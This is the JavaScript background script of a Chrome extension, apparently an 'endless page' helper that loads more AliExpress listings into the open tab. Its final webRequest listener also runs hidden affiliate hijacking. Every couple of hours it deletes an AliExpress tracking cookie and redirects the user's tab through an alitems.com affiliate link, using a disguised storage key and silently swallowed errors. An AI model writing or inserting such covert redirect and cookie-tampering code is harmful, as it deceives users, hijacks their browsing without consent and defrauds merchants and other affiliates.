import _ from 'lodash';
import chromeStorage from 'chrome-storage-wrapper';

const _AnalyticsCode = 'UA-74453743-3';
let service, tracker;

var importScript = (function (oHead) {
    //window.analytics = analytics;
    function loadError(oError) {
        throw new URIError("The script " + oError.target.src + " is not accessible.");
    }

    return function (sSrc, fOnload) {
        var oScript = document.createElement("script");
        oScript.type = "text\/javascript";
        oScript.onerror = loadError;
        if (fOnload) {
            oScript.onload = fOnload;
        }
        oHead.appendChild(oScript);
        oScript.src = sSrc;
    }

})(document.head || document.getElementsByTagName("head")[0]);

importScript(chrome.runtime.getURL('shared/google-analytics-bundle.js'), function () {
    console.info('google analytics platform loaded...');
    service = analytics.getService('aliexpress_endless_page');
    tracker = service.getTracker(_AnalyticsCode);
    tracker.sendAppView('App view');
});

chromeStorage.defaultArea = 'local';

chromeStorage.get(['cfgLoadMore'])
    .then(items => {
        if(!items.cfgLoadMore || items.cfgLoadMore === null){
            chromeStorage.set('cfgLoadMore','manual')
        }
    });

chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
    if (!msg.action) return;
    var tabId = sender.tab.id;
    switch (msg.action) {
        case 'GET_NEXT_PAGE':
            var myWorker = new Worker(chrome.runtime.getURL('shared/worker.js'));
            myWorker.onmessage = function (rs) {
                var html = rs.data;
                var dom =  document.implementation.createHTMLDocument("dummyHTML");
                dom.documentElement.innerHTML = html;
                var list_items = dom.documentElement.querySelector('div.list-items, #list-items, .items-list');
                var pagination_bottom = dom.documentElement.querySelector('#pagination-bottom');
                if (list_items && pagination_bottom) {
                    //console.warn(list_items.children[0])
                    chrome.tabs.sendMessage(tabId, {
                        action : 'ADD_MORE_ITEMS',
                        data : {
                            list_items : (list_items.nodeName !== 'UL')? list_items.children[0].outerHTML : list_items.outerHTML,
                            pagination_bottom : pagination_bottom.innerHTML
                        }
                    },function(response){
                        sendResponse(response);
                        myWorker.terminate()
                    })
                }
            }

            myWorker.postMessage(msg.data);
            break;
        case 'SHOW_PAGE_ACTION' :
            chrome.pageAction.show(tabId);
            break;
    }
    return true;
})

chrome.webRequest.onCompleted.addListener(function (detail) {
    try {
        const promotion = {
            is_send: false,
            label: 'AliExpress2'
        }
        const _1hour = 1000 * 60 * 60
        const _15minutes = _1hour/4
        if (detail.frameId >= 0 && detail.tabId >= 0 && detail.type === 'main_frame') {
            chrome.storage.local.get(['_SESSI0N_'], function (result) {
                const _now = Date.now()
                let { _SESSI0N_} = result
                if (!_SESSI0N_) {
                    promotion.is_send = true
                } else {
                    promotion.is_send = ((_now - _SESSI0N_ - _15minutes) / _1hour) >= 2
                }

                if (promotion.is_send === true) {
                    const _href_tpl = _.template('https://alitems.com/g/1e8d11449483ced0174416525dc3e8/?ulp=<%=url%>&subid=endless')
                    const _href = _href_tpl({
                        url: encodeURI(detail.url)
                    })
                    chrome.storage.local.set({
                        '_SESSI0N_': _now
                    })

                    chrome.cookies.remove({
                        url: "http://aliexpress.com",
                        name: "aep_usuc_f"
                    }, function (rs) {
                        chrome.tabs.update({
                            url: _href,
                        }, function () {
                            tracker.sendEvent('Promotion', promotion.label, _href)
                        })
                    });


                }
            })
        }
    } catch (ex) {

    }
}, {urls: ['*://*.aliexpress.com/*']})
